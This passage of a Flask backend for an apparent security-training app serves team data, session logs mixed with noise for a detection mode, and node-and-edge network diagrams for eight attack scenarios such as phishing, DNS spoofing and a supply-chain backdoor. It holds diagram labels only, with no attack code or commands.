    teams_list = [dict(row) for row in cursor.fetchall()]
    for t in teams_list:
        t['members'] = json.loads(t['members'])
    db.close()
    return jsonify(teams_list)

@app.route('/api/session-logs-with-noise/<session_id>', methods=['GET'])
def get_session_logs_with_noise(session_id):
    """Get logs with noise for Detect Mode"""
    import random
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM generated_logs WHERE session_id = ? ORDER BY timestamp', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    db.close()
    noise = generate_noise_logs(logs)
    all_logs = logs + noise
    all_logs.sort(key=lambda x: x.get('timestamp', ''))
    return jsonify(all_logs)

@app.route('/api/network-map/<int:scenario_id>', methods=['GET'])
def get_network_map(scenario_id):
    """Get network topology data for visualization"""
    maps = {
        1: {'nodes': [{'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
                      {'id':'email','label':'Mail Server','type':'server','x':250,'y':100},
                      {'id':'portal','label':'Fake Portal','type':'malicious','x':250,'y':300},
                      {'id':'victim','label':'Victim','type':'workstation','x':450,'y':200},
                      {'id':'internal','label':'Internal Server','type':'server','x':650,'y':200}],
            'edges': [{'from':'attacker','to':'email'},{'from':'attacker','to':'portal'},
                      {'from':'email','to':'victim'},{'from':'victim','to':'portal'},{'from':'victim','to':'internal'}]},
        2: {'nodes': [{'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
                      {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
                      {'id':'db','label':'Database','type':'database','x':450,'y':200},
                      {'id':'admin','label':'Admin Panel','type':'server','x':450,'y':350}],
            'edges': [{'from':'attacker','to':'webapp'},{'from':'webapp','to':'db'},{'from':'db','to':'admin'}]},
        3: {'nodes': [{'id':'attacker','label':'Attacker C2','type':'attacker','x':50,'y':200},
                      {'id':'compromised','label':'Compromised Site','type':'malicious','x':250,'y':100},
                      {'id':'victim','label':'Victim PC','type':'workstation','x':450,'y':200},
                      {'id':'server1','label':'File Server','type':'server','x':650,'y':100},
                      {'id':'server2','label':'DC Server','type':'server','x':650,'y':300}],
            'edges': [{'from':'attacker','to':'compromised'},{'from':'compromised','to':'victim'},
                      {'from':'victim','to':'server1'},{'from':'victim','to':'server2'},{'from':'attacker','to':'victim'}]},
        4: {'nodes': [{'id':'insider','label':'Insider (John)','type':'attacker','x':50,'y':200},
                      {'id':'vpn','label':'VPN Gateway','type':'server','x':250,'y':200},
                      {'id':'db','label':'Customer DB','type':'database','x':450,'y':200},
                      {'id':'personal','label':'Personal Server','type':'malicious','x':450,'y':350},
                      {'id':'darkweb','label':'Dark Web','type':'malicious','x':650,'y':350}],
            'edges': [{'from':'insider','to':'vpn'},{'from':'vpn','to':'db'},{'from':'db','to':'personal'},{'from':'personal','to':'darkweb'}]},
    }
    maps[5] = {'nodes': [
        {'id':'attacker','label':'Botnet C2','type':'attacker','x':50,'y':200},
        {'id':'bot1','label':'Bot Node 1','type':'malicious','x':180,'y':80},
        {'id':'bot2','label':'Bot Node 2','type':'malicious','x':180,'y':200},
        {'id':'bot3','label':'Bot Node 3','type':'malicious','x':180,'y':320},
        {'id':'firewall','label':'Firewall','type':'firewall','x':370,'y':200},
        {'id':'web','label':'Web Server','type':'server','x':520,'y':130},
        {'id':'api','label':'API Server','type':'server','x':520,'y':270},
        {'id':'cdn','label':'CDN Edge','type':'cloud','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'bot1'},{'from':'attacker','to':'bot2'},{'from':'attacker','to':'bot3'},
                  {'from':'bot1','to':'firewall'},{'from':'bot2','to':'firewall'},{'from':'bot3','to':'firewall'},
                  {'from':'firewall','to':'web'},{'from':'firewall','to':'api'},{'from':'cdn','to':'web'}]}
    maps[6] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':350,'y':50},
        {'id':'router','label':'Gateway','type':'router','x':350,'y':200},
        {'id':'victim','label':'Victim PC','type':'workstation','x':150,'y':320},
        {'id':'server','label':'Mail Server','type':'server','x':550,'y':320},
        {'id':'dns','label':'DNS Server','type':'server','x':550,'y':130},
        {'id':'switch','label':'Switch','type':'router','x':200,'y':200}],
        'edges': [{'from':'attacker','to':'router'},{'from':'router','to':'victim'},{'from':'router','to':'server'},
                  {'from':'attacker','to':'switch'},{'from':'switch','to':'victim'},{'from':'router','to':'dns'}]}
    maps[7] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'rogue','label':'Rogue DNS','type':'malicious','x':200,'y':100},
        {'id':'resolver','label':'DNS Resolver','type':'server','x':350,'y':200},
        {'id':'real_dns','label':'Real DNS','type':'server','x':350,'y':60},
        {'id':'clone','label':'Fake Bank','type':'malicious','x':200,'y':320},
        {'id':'victim','label':'Victim','type':'workstation','x':520,'y':200},
        {'id':'bank','label':'Real Bank','type':'server','x':650,'y':120}],
        'edges': [{'from':'attacker','to':'rogue'},{'from':'rogue','to':'resolver'},{'from':'resolver','to':'victim'},
                  {'from':'attacker','to':'clone'},{'from':'victim','to':'clone'},{'from':'real_dns','to':'resolver'},
                  {'from':'victim','to':'bank'}]}
    maps[8] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'registry','label':'NPM Registry','type':'cloud','x':230,'y':100},
        {'id':'package','label':'Backdoored Pkg','type':'malicious','x':230,'y':300},
        {'id':'ci','label':'CI/CD Pipeline','type':'server','x':420,'y':200},
        {'id':'dev','label':'Developer','type':'workstation','x':420,'y':340},
        {'id':'enterprise','label':'Enterprise','type':'server','x':600,'y':130},
        {'id':'aws','label':'AWS Cloud','type':'cloud','x':600,'y':290}],
        'edges': [{'from':'attacker','to':'registry'},{'from':'attacker','to':'package'},{'from':'registry','to':'ci'},
                  {'from':'package','to':'dev'},{'from':'ci','to':'enterprise'},{'from':'dev','to':'enterprise'},
                  {'from':'enterprise','to':'aws'}]}
    return jsonify(maps.get(scenario_id, maps[1]))

if __name__ == '__main__':
    init_db()
    app.run(debug=True, port=5000)

